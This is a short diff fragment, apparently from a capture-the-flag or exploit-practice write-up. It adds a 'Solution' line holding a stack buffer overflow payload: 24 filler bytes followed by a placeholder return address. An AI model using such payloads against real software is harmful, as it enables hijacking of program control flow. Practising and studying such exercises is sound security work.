@@ -19,3 +19,6 @@ int main() {
 
 Soltuion
 
+Payload --> python3 -c 'print("A"*24+<ret adress>)'
+
+
